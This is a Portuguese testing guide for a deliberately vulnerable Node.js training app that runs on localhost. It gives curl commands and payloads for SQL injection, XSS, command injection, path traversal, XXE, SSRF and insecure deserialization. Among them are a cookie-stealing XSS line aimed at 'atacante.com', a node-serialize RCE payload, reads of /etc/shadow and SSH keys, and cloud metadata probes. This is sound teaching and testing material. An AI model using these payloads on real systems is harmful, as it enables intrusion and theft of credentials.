# 🧪 Guia Rápido de Testes - Node Goat

Este guia fornece comandos e exemplos práticos para testar cada uma das vulnerabilidades implementadas na aplicação.

## 🚀 Pré-requisitos

1. Certifique-se de que a aplicação está rodando:
```bash
npm start
```

2. A aplicação estará disponível em: `http://localhost:3000`

---

## 1. 💉 SQL Injection (CWE-89)

### Teste via Navegador
1. Acesse: `http://localhost:3000/buscar`
2. No campo de email, insira: `' OR '1'='1`
3. Clique em "Buscar"
4. **Resultado esperado:** Todos os usuários serão exibidos

### Teste via cURL
```bash
# Listar todos os usuários
curl -X POST http://localhost:3000/buscar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=' OR '1'='1"

# UNION-based SQL Injection
curl -X POST http://localhost:3000/buscar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=' UNION SELECT 1,2,3,4--"
```

### Outras Payloads para Testar
```sql
' OR 1=1--
' OR 'a'='a
admin'--
' UNION SELECT NULL--
```

---

## 2. 🎭 Cross-Site Scripting - XSS (CWE-79)

### Teste via Navegador
1. Acesse: `http://localhost:3000/comentario`
2. No campo de comentário, insira: `<script>alert('XSS Vulnerável!')</script>`
3. Clique em "Enviar"
4. **Resultado esperado:** Um alerta JavaScript será exibido

### Teste via cURL
```bash
# XSS básico
curl -X POST http://localhost:3000/comentario \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comentario=<script>alert('XSS')</script>"

# XSS com roubo de cookies
curl -X POST http://localhost:3000/comentario \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comentario=<script>fetch('http://atacante.com?c='+document.cookie)</script>"
```

### Outras Payloads para Testar
```html
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

---

## 3. ⚙️ Command Injection (CWE-78)

### Teste via Navegador
1. Acesse: `http://localhost:3000/executar`
2. No campo de comando, insira: `ls; whoami; pwd`
3. Clique em "Executar"
4. **Resultado esperado:** Múltiplos comandos serão executados

### Teste via cURL
```bash
# Executar múltiplos comandos
curl -X POST http://localhost:3000/executar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comando=ls; whoami; pwd"

# Listar arquivos sensíveis (Linux)
curl -X POST http://localhost:3000/executar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comando=cat /etc/passwd"

# Informações do sistema
curl -X POST http://localhost:3000/executar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comando=uname -a"
```

### Outras Payloads para Testar
```bash
ls && whoami
cat package.json | grep name
echo $PATH
id
env
```

---

## 4. 📁 Path Traversal (CWE-22)

### Teste via Navegador
1. Acesse: `http://localhost:3000/arquivo`
2. No campo de nome do arquivo, insira: `../../../etc/passwd`
3. Clique em "Download"
4. **Resultado esperado:** O conteúdo do arquivo /etc/passwd será exibido (se no Linux)

### Teste via cURL
```bash
# Tentar ler /etc/passwd (Linux)
curl -X POST http://localhost:3000/arquivo \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "filename=../../../etc/passwd"

# Ler o próprio package.json
curl -X POST http://localhost:3000/arquivo \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "filename=package.json"

# Ler app.js
curl -X POST http://localhost:3000/arquivo \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "filename=app.js"
```

### Outras Payloads para Testar
```
../../etc/shadow
../.env
../../../root/.ssh/id_rsa
../../../proc/self/environ
```

---

## 5. 🔑 Hardcoded Credentials (CWE-798)

### Teste via Navegador
1. Acesse: `http://localhost:3000/config`
2. **Resultado esperado:** As credenciais codificadas serão exibidas

### Teste via cURL
```bash
curl http://localhost:3000/config
```

### Verificar no Código
```bash
# Buscar por credenciais no código
grep -r "senha" app.js
grep -r "password" app.js
grep -r "API_KEY" app.js
```

---

## 6. 🍪 Insecure Deserialization (CWE-502)

### Teste via Navegador
1. Acesse: `http://localhost:3000/cookie`
2. Insira um JSON válido: `{"nome":"João","admin":false}`
3. Clique em "Salvar Cookie"
4. Acesse: `http://localhost:3000/cookie/ler` para ver o cookie deserializado

### Teste via cURL
```bash
# Criar cookie normal
curl -X POST http://localhost:3000/cookie \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'userData={"nome":"Teste","admin":false}' \
  -c cookies.txt

# Ler cookie
curl http://localhost:3000/cookie/ler \
  -b cookies.txt
```

### ⚠️ Payload Perigoso (apenas para demonstração em ambiente de teste!)
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(e,s,st){console.log(s)});}()"}
```

**ATENÇÃO:** Este payload pode executar código no servidor. Use apenas em ambiente controlado!

---

## 7. 📄 XML External Entity - XXE (CWE-611)

### Teste via Navegador
1. Acesse: `http://localhost:3000/xml`
2. Insira o seguinte XML:
```xml
<?xml version="1.0"?>
<!DOCTYPE dados [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<dados>
  <nome>&xxe;</nome>
</dados>
```
3. Clique em "Processar"
4. **Resultado esperado:** O conteúdo do /etc/passwd será exibido (se no Linux)

### Teste via cURL
```bash
# XXE para ler arquivo local
curl -X POST http://localhost:3000/xml \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE dados [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<dados>
  <nome>&xxe;</nome>
</dados>'
```

### Outras Payloads para Testar
```xml
<!-- Ler package.json -->
<?xml version="1.0"?>
<!DOCTYPE dados [
  <!ENTITY xxe SYSTEM "file:///home/runner/work/node_goat__veracode_plugin/node_goat__veracode_plugin/package.json">
]>
<dados>
  <conteudo>&xxe;</conteudo>
</dados>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE dados [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<dados>
  <conteudo>&xxe;</conteudo>
</dados>
```

---

## 8. 🌐 Server-Side Request Forgery - SSRF (CWE-918)

### Teste via Navegador
1. Acesse: `http://localhost:3000/proxy`
2. Insira uma URL: `http://example.com`
3. Clique em "Buscar"
4. **Resultado esperado:** O conteúdo da URL será exibido

### Teste via cURL
```bash
# SSRF básico
curl -X POST http://localhost:3000/proxy \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://example.com"

# Tentar acessar localhost
curl -X POST http://localhost:3000/proxy \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://localhost:3000"

# Tentar acessar metadados AWS (em ambiente cloud)
curl -X POST http://localhost:3000/proxy \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://169.254.169.254/latest/meta-data/"
```

### Outras Payloads para Testar
```
http://localhost:22
http://127.0.0.1:3306
http://192.168.1.1
http://0.0.0.0:6379
```

---

## 9. 📦 Vulnerabilidades de SCA

### Verificar com npm audit
```bash
# Verificar vulnerabilidades
npm audit

# Ver detalhes em JSON
npm audit --json

# Ver apenas vulnerabilidades críticas e altas
npm audit --audit-level=high

# Tentar corrigir automaticamente (não recomendado neste caso)
# npm audit fix
```

### Verificar com Snyk (se instalado)
```bash
# Instalar Snyk globalmente
npm install -g snyk

# Autenticar
snyk auth

# Testar vulnerabilidades
snyk test

# Monitorar projeto
snyk monitor
```

---

## 🔍 Ferramentas de Teste Automático

### 1. OWASP ZAP
```bash
# Fazer scan automatizado
zap-cli quick-scan http://localhost:3000
```

### 2. SQLMap (para SQL Injection)
```bash
# Testar SQL Injection
sqlmap -u "http://localhost:3000/buscar" \
  --data="email=test@example.com" \
  --batch --dbs
```

### 3. Burp Suite
1. Configure o proxy no navegador
2. Acesse as funcionalidades da aplicação
3. Use o Burp Scanner para detectar vulnerabilidades

### 4. Nikto (Scanner de vulnerabilidades web)
```bash
nikto -h http://localhost:3000
```

---

## 📊 Checklist de Testes

- [ ] SQL Injection testado e funcionando
- [ ] XSS testado e funcionando
- [ ] Command Injection testado e funcionando
- [ ] Path Traversal testado e funcionando
- [ ] Hardcoded Credentials verificadas
- [ ] Insecure Deserialization testada
- [ ] XXE testado e funcionando
- [ ] SSRF testado e funcionando
- [ ] npm audit executado (29+ vulnerabilidades esperadas)
- [ ] Veracode SAST executado
- [ ] Veracode SCA executado

---

## ⚠️ Avisos Importantes

1. **NÃO USE EM PRODUÇÃO** - Esta aplicação é intencionalmente vulnerável
2. **USE APENAS EM AMBIENTE ISOLADO** - Não exponha na internet
3. **OBTENHA AUTORIZAÇÃO** - Sempre tenha permissão antes de testar
4. **DOCUMENTAÇÃO** - Registre todos os testes realizados
5. **RESPONSABILIDADE** - Use apenas para fins educacionais

---

## 📚 Recursos Adicionais

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 🆘 Solução de Problemas

### Aplicação não inicia
```bash
# Verificar se a porta 3000 está em uso
lsof -i :3000

# Matar processo na porta 3000
kill -9 $(lsof -t -i:3000)

# Reinstalar dependências
rm -rf node_modules package-lock.json
npm install
```

### Erro de permissão ao executar comandos
- Certifique-se de estar executando em um ambiente Linux/Unix
- Alguns comandos podem requerer privilégios específicos

### XXE não funciona
- Verifique se está em um sistema com arquivos Unix (/etc/passwd)
- Tente com arquivos locais do projeto (package.json, app.js)

---

**Happy Hacking! (Responsável)** 🎯
